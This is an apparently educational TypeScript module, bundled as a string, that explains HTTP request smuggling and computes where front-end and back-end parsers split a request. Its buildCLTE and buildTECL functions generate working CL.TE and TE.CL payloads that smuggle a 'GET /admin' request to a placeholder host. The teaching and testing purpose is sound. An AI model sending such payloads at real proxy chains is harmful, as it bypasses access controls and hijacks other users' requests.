var e=`// HTTP request smuggling — what happens when two servers in a chain disagree about where one\r
// request ends and the next begins. An HTTP/1.1 message can declare its body length two ways:\r
// Content-Length (a byte count) or Transfer-Encoding: chunked (size-prefixed chunks ending in a\r
// 0-chunk). RFC 9112 §6.1 says if BOTH are present, Transfer-Encoding wins and Content-Length must\r
// be ignored (a server SHOULD reject the message). When a front-end proxy and the back-end server\r
// pick DIFFERENTLY, they split the same bytes at different offsets — and the leftover bytes get\r
// prepended to the next victim's request. We frame the same raw buffer two ways and show exactly\r
// where each parser stops and which bytes get smuggled across the cut. Pure, tested.\r
\r
export type Framing = 'CL' | 'TE';\r
\r
export interface FrameResult {\r
  framing: Framing;\r
  bodyStart: number; // byte offset where the body begins (just past the blank line)\r
  consumed: number; // total bytes this parser treats as ONE request\r
  valid: boolean; // did the framing parse cleanly?\r
  note: string;\r
}\r
\r
const headerValue = (raw: string, name: string): string | null => {\r
  const head = raw.slice(0, raw.indexOf('\\r\\n\\r\\n'));\r
  for (const line of head.split('\\r\\n')) {\r
    const i = line.indexOf(':');\r
    if (i > 0 && line.slice(0, i).trim().toLowerCase() === name) return line.slice(i + 1).trim();\r
  }\r
  return null;\r
};\r
\r
/** Determine the request boundary under one framing interpretation. */\r
export function frame(raw: string, framing: Framing): FrameResult {\r
  const he = raw.indexOf('\\r\\n\\r\\n');\r
  const bodyStart = he < 0 ? raw.length : he + 4;\r
  if (framing === 'CL') {\r
    const raw_cl = headerValue(raw, 'content-length');\r
    const cl = parseInt(raw_cl ?? '0', 10);\r
    return { framing, bodyStart, consumed: bodyStart + (isNaN(cl) ? 0 : cl), valid: raw_cl != null && !isNaN(cl), note: \`Content-Length: \${cl} → reads exactly \${cl} body bytes\` };\r
  }\r
  // chunked: walk size-prefixed chunks until the 0-size terminator\r
  let p = bodyStart;\r
  while (p < raw.length) {\r
    const nl = raw.indexOf('\\r\\n', p);\r
    if (nl < 0) return { framing, bodyStart, consumed: raw.length, valid: false, note: 'malformed chunk: no size line' };\r
    const size = parseInt(raw.slice(p, nl).trim(), 16);\r
    if (isNaN(size)) return { framing, bodyStart, consumed: raw.length, valid: false, note: 'malformed chunk size' };\r
    p = nl + 2;\r
    if (size === 0) { p += 2; return { framing, bodyStart, consumed: p, valid: true, note: 'chunked → ends at the 0-size chunk' }; }\r
    p += size + 2; // chunk data + its trailing CRLF\r
  }\r
  return { framing, bodyStart, consumed: raw.length, valid: false, note: 'chunked → no terminating 0-chunk' };\r
}\r
\r
export interface Desync {\r
  front: FrameResult;\r
  back: FrameResult;\r
  kind: 'CL.TE' | 'TE.CL' | 'aligned';\r
  smuggledStart: number;\r
  smuggledEnd: number;\r
  smuggled: string; // the bytes the front-end forwarded that the back-end treats as the NEXT request\r
  bothPresent: boolean;\r
  rfcSafe: Framing; // the framing RFC 9112 §6.1 says to use when both headers are present\r
}\r
\r
/** Run both parsers over the same bytes and find what gets smuggled across their disagreement. */\r
export function desync(raw: string, frontFraming: Framing, backFraming: Framing): Desync {\r
  const front = frame(raw, frontFraming);\r
  const back = frame(raw, backFraming);\r
  const lo = Math.min(front.consumed, back.consumed);\r
  const hi = Math.max(front.consumed, back.consumed);\r
  const kind = frontFraming === 'CL' && backFraming === 'TE' ? 'CL.TE' : frontFraming === 'TE' && backFraming === 'CL' ? 'TE.CL' : 'aligned';\r
  return {\r
    front, back, kind,\r
    smuggledStart: lo, smuggledEnd: hi, smuggled: raw.slice(lo, hi),\r
    bothPresent: headerValue(raw, 'content-length') != null && headerValue(raw, 'transfer-encoding') != null,\r
    rfcSafe: 'TE', // RFC 9112 §6.1: Transfer-Encoding overrides Content-Length\r
  };\r
}\r
\r
/** A CL.TE payload: front-end uses Content-Length (forwards everything), back-end uses chunked\r
 *  (stops at the 0-chunk), so the trailing bytes are smuggled as the start of the next request. */\r
export function buildCLTE(): string {\r
  const smuggled = 'GET /admin HTTP/1.1\\r\\nHost: victim.example\\r\\nFoo: ';\r
  const body = \`0\\r\\n\\r\\n\${smuggled}\`;\r
  return \`POST / HTTP/1.1\\r\\nHost: victim.example\\r\\nContent-Length: \${body.length}\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n\${body}\`;\r
}\r
\r
/** A TE.CL payload: front-end uses chunked (reads the whole chunk), back-end uses a small\r
 *  Content-Length (reads only the chunk-size line), leaving the chunk body as the next request. */\r
export function buildTECL(): string {\r
  const smuggled = 'GET /admin HTTP/1.1\\r\\nHost: victim.example\\r\\nX: ';\r
  const hex = smuggled.length.toString(16);\r
  const body = \`\${hex}\\r\\n\${smuggled}\\r\\n0\\r\\n\\r\\n\`;\r
  const cl = \`\${hex}\\r\\n\`.length; // back-end reads only the chunk-size line\r
  return \`POST / HTTP/1.1\\r\\nHost: victim.example\\r\\nTransfer-Encoding: chunked\\r\\nContent-Length: \${cl}\\r\\n\\r\\n\${body}\`;\r
}\r
`;export{e as default};